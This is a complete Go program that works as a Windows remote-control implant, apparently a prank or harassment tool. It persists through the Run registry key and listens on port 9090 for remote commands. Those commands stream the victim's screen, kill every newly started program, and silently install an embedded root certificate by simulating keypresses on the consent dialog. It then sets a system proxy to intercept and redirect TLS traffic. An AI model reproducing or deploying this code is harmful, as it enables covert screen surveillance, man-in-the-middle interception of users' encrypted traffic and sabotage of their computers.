package main

import (
	"bufio"
	"bytes"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"github.com/AdguardTeam/gomitmproxy"
	"github.com/AdguardTeam/gomitmproxy/mitm"
	"github.com/AdguardTeam/gomitmproxy/proxyutil"
	"github.com/lxn/win"
	"github.com/micmonay/keybd_event"
	"github.com/mitchellh/go-ps"
	"github.com/vova616/screenshot"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"image/jpeg"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// for redirect
type CustomCertsStorage struct {
	// certsCache is a cache with the generated certificates.
	certsCache map[string]*tls.Certificate
}

func (c *CustomCertsStorage) Get(key string) (cert *tls.Certificate, ok bool) {
	cert, ok = c.certsCache[key]

	return cert, ok
}

// Set saves the certificate to the storage.
func (c *CustomCertsStorage) Set(key string, cert *tls.Certificate) {
	c.certsCache[key] = cert
}

var runningClose = false
var runningRedirect = false
var stopRedirect1 = false

func sendImages(conn net.Conn) {
	for {
		img, err := screenshot.CaptureScreen()
		if err != nil {
			log.Println(err)
			continue
		}
		buf := new(bytes.Buffer)
		err = jpeg.Encode(buf, img, nil)
		if err != nil {
			log.Println(err)
			continue
		}
		encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
		_, err = conn.Write([]byte(encoded))
		if err != nil {
			log.Println(err)
			return
		}
		time.Sleep(time.Millisecond)
	}
}

func closeNewProcesses(stopClose chan bool) {
	programOpened := map[int]bool{}
	importantProcesses := map[string]bool{
		"explorer.exe":                true,
		"powershell.exe":              true,
		"svchost.exe":                 true,
		"wininit.exe":                 true,
		"winlogon.exe":                true,
		"lsass.exe":                   true,
		"services.exe":                true,
		"csrss.exe":                   true,
		"smss.exe":                    true,
		"System":                      true,
		"Registry":                    true,
		"System Idle":                 true,
		"System Interrupts":           true,
		"System Task":                 true,
		"goland64.exe":                true,
		"gofmt.exe":                   true,
		"git.exe":                     true,
		"taskkill.exe":                true,
		"conhost.exe":                 true,
		"dllhost.exe":                 true,
		"cmd.exe":                     true,
		"OpenWith.exe":                true,
		"consent.exe":                 true,
		"msiexec.exe":                 true,
		"SearchProtocolHost.exe":      true,
		"mchost.exe":                  true,
		"RuntimeBroker.exe":           true,
		"ApplicationFrameHost.exe":    true,
		"ShellExperienceHost.exe":     true,
		"StartMenuExperienceHost.exe": true,
		"backgroundTaskHost.exe":      true,
		"smartscreen.exe":             true,
		"WmiPrvSE.exe":                true,
		"runnerw.exe":                 true,
	}
	homeDir, err := os.UserHomeDir()
	if err != nil {
		panic(err)
	}

	downloadsDir := filepath.Join(homeDir, "Downloads")

	fmt.Println(downloadsDir)

	files, err := ioutil.ReadDir(downloadsDir)
	if err != nil {
		fmt.Println("Error reading directory:", err)
		return
	}
	// Get a list of all processes running on the system
	processes, err := ps.Processes()
	if err != nil {
		fmt.Println("Error getting processes: ", err)
		return
	}

	// Loop continuously to detect new processes
	for {
		select {
		case <-stopClose:
			// Stop the loop when the stop channel receives a signal
			fmt.Println("Closing function stopped")
			return
		default:
			newProcesses, err := ps.Processes()
			if err != nil {
				fmt.Println("Error getting new processes: ", err)
				continue
			}

			// Compare the current list of processes with the new list
			for _, newProcess := range newProcesses {
				found := false
				for _, process := range processes {
					if newProcess.Pid() == process.Pid() {
						found = true
						break
					}
				}

				// If the process is not in the current list, it's new
				if !found {
					if !importantProcesses[newProcess.Executable()] && !programOpened[newProcess.Pid()] {
						//go func() {
						kill := exec.Command("TASKKILL", "/F", "/PID", strconv.Itoa(newProcess.Pid()))
						kill.Stderr = os.Stderr
						kill.Stdout = os.Stdout
						err := kill.Run()
						if err != nil {
							fmt.Println("kill error", newProcess.Executable(), err)
						}
						if err == nil {
							fmt.Println("killed: ", newProcess.Executable(), " ", newProcess.Pid())
							if len(files) == 0 {
								fmt.Println("No files found in Downloads directory")
								return
							}
							randomIndex := rand.Intn(len(files))
							randomFile := files[randomIndex]

							// Open the file.
							filePath := filepath.Join(downloadsDir, randomFile.Name())
							// open the file using the default program associated with it
							cmd := exec.Command("cmd", "/c", "start", filePath)
							err = cmd.Run()
							if err != nil {
								fmt.Println("Error opening file:", err)
								return
							}
							processState := cmd.ProcessState
							pid := processState.Pid()
							exeName := filepath.Base(cmd.Path)
							fmt.Println(processState.String())
							fmt.Println(pid, " ", exeName, " ", newProcess.Executable(), " ", newProcess.Pid())
							programOpened[pid] = true
						}
						//}()
					}
				}
			}

			// Update the current list of processes
			processes = newProcesses

			// Sleep for a short interval before checking for new processes again
			time.Sleep(5 * time.Millisecond)
		}

	}
}

// to check if cert is installed
var x = 1

func IsDialogBoxOpen() bool {
	var hwnd win.HWND
	hwnd = win.GetForegroundWindow()
	if hwnd != 0 {
		var class [256]uint16
		win.GetClassName(hwnd, &class[0], 256)

		className := win.UTF16PtrToString(&class[0])
		if className == "#32770" {
			kb, err := keybd_event.NewKeyBonding()
			if err != nil {
				fmt.Println("Failed to create key bonding:", err)
			}
			kb.SetKeys(keybd_event.VK_LEFT)
			err = kb.Launching()
			if err != nil {
				fmt.Println("Failed to simulate left arrow key press:", err)
			}
			kb.SetKeys(keybd_event.VK_ENTER)
			err = kb.Launching()
			if err != nil {
				fmt.Println("Failed to simulate enter key press:", err)
			}
			return true
		}
	}

	return false
}

//go:embed demo.crt
var certdata []byte

//go:embed demo.key
var keydata []byte

func find() {
	for {
		if IsDialogBoxOpen() {
			break
		}
	}
	return
}

func redirect(source string, dest string) {
	// Read the MITM cert and key.

	tlsCert, err := tls.X509KeyPair(certdata, keydata)
	privateKey := tlsCert.PrivateKey.(*rsa.PrivateKey)

	x509c, err := x509.ParseCertificate(tlsCert.Certificate[0])
	if err != nil {
		log.Fatal(err)
	}

	if x == 1 {
		go find()
		// Parse certificate
		block, _ := pem.Decode(certdata)
		if block == nil {
			log.Fatal("Failed to parse certificate")
		}
		cert, err := x509.ParseCertificate(block.Bytes)
		if err != nil {
			log.Fatal(err)
		}

		store, err := windows.CertOpenSystemStore(0, windows.StringToUTF16Ptr("ROOT"))
		if err != nil {
			log.Fatal(err)
		}

		certContext, _ := windows.CertCreateCertificateContext(windows.X509_ASN_ENCODING|windows.PKCS_7_ASN_ENCODING, &cert.Raw[0], uint32(len(cert.Raw)))
		if certContext == nil {
			log.Fatal("Failed to create certificate context")
		}
		defer func(ctx *windows.CertContext) {
			err := windows.CertFreeCertificateContext(ctx)
			if err != nil {

			}
		}(certContext)

		err = windows.CertAddCertificateContextToStore(store, certContext, windows.CERT_STORE_ADD_ALWAYS, nil)
		if err != nil {
			log.Fatal(err)
		}

		fmt.Println("Certificate installed to Trusted Root Certification Authorities store successfully")
		x = 2
	}
	mitmConfig, err := mitm.NewConfig(x509c, privateKey, &CustomCertsStorage{
		certsCache: map[string]*tls.Certificate{}},
	)

	if err != nil {
		log.Fatal(err)
	}

	// Generate certs valid for 7 days.
	mitmConfig.SetValidity(time.Hour * 24 * 7)
	// Set certs organization.
	mitmConfig.SetOrganization("gomitmproxy")

	proxy := gomitmproxy.NewProxy(gomitmproxy.Config{
		ListenAddr: &net.TCPAddr{
			IP:   net.IPv4(0, 0, 0, 0),
			Port: 8080,
		},
		MITMConfig: mitmConfig,
		OnRequest: func(session *gomitmproxy.Session) (*http.Request, *http.Response) {
			req := session.Request()
			fmt.Println(req.URL.String())
			if req.URL.Host == source {
				session.SetProp("blocked", true)
			} else if source == "all" && strings.Contains(req.URL.Host, "www") {
				//make request to just a site doesn't matter since it will be blocked
				req2, err := http.NewRequest("GET", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", nil)
				if err != nil {
					fmt.Println("Error creating request:", err)
				}
				return req2, nil
			}
			return nil, nil
		},
		OnResponse: func(session *gomitmproxy.Session) *http.Response {
			req := session.Request()
			if blocked, ok := session.GetProp("blocked"); ok && blocked.(bool) {
				fmt.Println(req.URL.Host)
				resp, err := http.Get(dest)
				if err != nil {
					log.Fatal(err)
				}
				res := proxyutil.NewResponse(http.StatusFound, resp.Body, req)
				res.Header.Set("Content-Type", "text/html")
				res.Header.Set("Location", dest)
				req.Response = res
				return res
			}
			return session.Response()
		},
	})
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Internet Settings`, registry.ALL_ACCESS)
	if err != nil {
		fmt.Println("Error:", err)
	}
	defer key.Close()

	// Set the proxy server and port
	err = key.SetStringValue("ProxyServer", "127.0.0.1:8080")
	if err != nil {
		fmt.Println("Error:", err)
	}

	// Enable the proxy server
	err = key.SetDWordValue("ProxyEnable", 1)
	if err != nil {
		fmt.Println("Error:", err)
	}

	fmt.Println("System proxy settings changed.")
	err = proxy.Start()
	if err != nil {
		log.Fatal(err)
	}

	for {
		if stopRedirect1 {
			err = key.SetDWordValue("ProxyEnable", 0)
			if err != nil {
				fmt.Println("Error:", err)
			}

			// Delete the proxy server
			err = key.DeleteValue("ProxyServer")
			if err != nil {
				fmt.Println("Error:", err)
			}

			fmt.Println("System proxy settings turned off.")
			proxy.Close()
			//Stop the loop when the stop channel receives a signal
			fmt.Println("Redirect function stopped")
			stopRedirect1 = false
			return
		}
	}
}

func stopClosing(stopClose chan bool) {
	// Send a signal to the stop channel to stop the closing function
	stopClose <- true
	time.Sleep(10 * time.Millisecond)
	runningClose = false
	return
}

func stopRedirecting() {
	// Send a signal to the stop channel to stop the redirect function
	stopRedirect1 = true
	runningRedirect = false
	return
}

func waitForStopClose(stopClose chan bool) {
	<-stopClose
}

func addToRegistry() error {
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %v", err)
	}

	runKey, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("failed to open Run registry key: %v", err)
	}
	defer runKey.Close()

	err = runKey.SetStringValue("MyApp", exePath)
	if err != nil {
		return fmt.Errorf("failed to set registry value: %v", err)
	}

	return nil
}

func main() {
	err := addToRegistry()
	if err != nil {
		fmt.Println("Error:", err)
	}
	// Start listening on port 9090
	listener, err := net.Listen("tcp", "0.0.0.0:9090")
	if err != nil {
		panic(err)
	}
	defer listener.Close()

	// Create a stop channel
	stopClose := make(chan bool)

	// Loop forever and handle incoming connections
	for {
		conn, err := listener.Accept()
		if err != nil {
			panic(err)
		}
		go handleConnection(conn, stopClose)
	}
}

func handleConnection(conn net.Conn, stopClose chan bool) {
	defer conn.Close()

	// Create a map of commands to functions
	commands := map[string]func(args []string){
		"closing": func(args []string) {
			if !runningClose {
				runningClose = true
				go closeNewProcesses(stopClose)
			} else {
				fmt.Println("Function closing is already running")
			}
		},
		"redirect": func(args []string) {
			if !runningRedirect {
				if len(args) == 2 {
					go redirect(args[0], args[1])
				} else {
					go redirect("", "")
				}
				runningRedirect = true
			} else {
				fmt.Println("Function redirect is already running")
			}
		},
		"screen": func(args []string) {
			go sendImages(conn)
		},
		"stopClosing":  func(args []string) { stopClosing(stopClose) },
		"stopRedirect": func(args []string) { stopRedirecting() },
	}
	go waitForStopClose(stopClose)
	// Read commands from the client and execute the corresponding function
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		command := scanner.Text()
		fmt.Println(command)
		parts := strings.Split(command, " ")
		if len(parts) > 0 {
			commandName := parts[0]
			commandArgs := parts[1:]
			if function, ok := commands[commandName]; ok {
				function(commandArgs)
			} else {
				fmt.Println("Unknown command:", command)
			}
		}
	}
	stopClosing(stopClose)
	stopRedirecting()

	runningClose = false
	runningRedirect = false
	stopRedirect1 = false

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Internet Settings`, registry.ALL_ACCESS)
	if err != nil {
		fmt.Println("Error:", err)
	}
	defer key.Close()

	fmt.Println("System proxy settings changed.")
	// Client connection was closed
	fmt.Println("Connection closed by client.")
	err = key.SetDWordValue("ProxyEnable", 0)
	if err != nil {
		fmt.Println("Error:", err)
	}

	// Delete the proxy server
	err = key.DeleteValue("ProxyServer")
	if err != nil {
		fmt.Println("Error:", err)
	}

	fmt.Println("System proxy settings turned off.")
}
